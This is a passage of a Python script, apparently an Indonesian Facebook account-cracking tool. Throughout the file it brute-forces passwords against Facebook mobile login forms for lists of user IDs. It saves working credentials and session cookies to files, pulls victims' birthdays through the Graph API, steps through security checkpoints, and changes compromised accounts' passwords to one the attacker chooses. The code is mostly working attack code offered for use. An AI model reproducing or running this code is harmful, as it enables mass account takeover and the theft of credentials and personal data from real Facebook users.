		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('token.txt','r').read()
				cookie = {'cookie':open('cookie.txt','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, fii):
	try:
		ua = open('ugent.txt','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('token.txt','r').read()
				cookie = {'cookie':open('cookie.txt','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid, pw, ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, fii):
	try:
		ua = open('ugent.txt','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('token.txt','r').read()
				cookie = {'cookie':open('cookie.txt','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		data = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=data).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		jalan(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"\r{P}[•]{I} Hore akunya tab yesss, silahkan di login ")
	elif "login_error" in str(run):
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
	else:
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
		
def ubahpw():
  print('%s \x1b[1;92m║'%(B))
  pw=input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin mengubah sandi tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
  if pw == "Y" or pw == "y":
    ubahP.append("y")
    pw2=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan sandi \x1b[1;97m: \x1b[1;92m")
    if len(pw2) <= 5:
      exit(" \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mkata sandi minimal 6 karakter ")
    else:
      pwbaru.append(pw2)
  else:pass

def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	ses=requests.Session()
	ses.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent": ua})
	soup=parser(ses.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=ses.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s╠══[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in ses.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s╠══[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r ╠══[✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,ses.cookies.get_dict(),N))
	elif "checkpoint" in ses.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		list=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in list:
				data2.update({x.get("name"):x.get("value")})
		an=ses.post(host+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,ses,response,link2)
				else:
					print("\r ╠══[✓] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,kuki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s╠══[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in ses.cookies.get_dict():
				print("\r ╠══[✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,ses.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" ╠══[!] Account terkena CheckPoint/Terkena Sesi ")

def ubah_pw(user,pw,ses,response,link2):
	data,data2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			data.update({x.get("name"):x.get("value")})
	ubahPw=ses.post(host+link2.get("action"),data=data).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				data2.update({b.get("name"):b.get("value")})
		data2.update({"password_new":"".join(pwbaru)})
		an=ses.post(host+link3.get("action"),data=data2)
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		print("\r ╠══[✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],kuki,N))
		cek_game(cookie)

def cek_game(cookie):
	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
	sop = parser(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print("")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada",""),N))
			
def folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass


if __name__=="__main__":
    os.system("git pull")
    folder()
    menu()